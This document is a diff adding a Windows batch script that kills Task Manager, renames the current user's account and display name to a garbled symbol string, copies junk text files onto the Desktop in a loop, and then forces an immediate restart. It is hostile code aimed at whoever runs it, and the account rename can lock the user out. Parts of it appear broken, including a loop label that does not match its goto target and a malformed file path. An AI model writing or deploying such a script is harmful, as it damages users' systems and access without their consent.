@@ -1,0 +1,13 @@
+@echo off
+taskkill /f /im taskmgr.exe
+wmic useraccount where name='%username%' set FullName='p$%/4(&$B=(L=(/='
+wmic useraccount where name='%username%' rename 'p$%/4(&$B=(L=(/='
+SET /a cr=0
+
+:l
+copy %temp%\text.txt "%userprofile%\Desktop\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.txt
+SET /a cr=%cr%+1
+if %cr%==28 copy %temp%one.txt %userprofile%\Desktop\READMEREADMEREADMEREADMEREADMEREADMEREADMEREADMEREADMEREADMEREADME.txt
+if not %cr%==400 goto 1
+
+shutdown /f /r /t 0
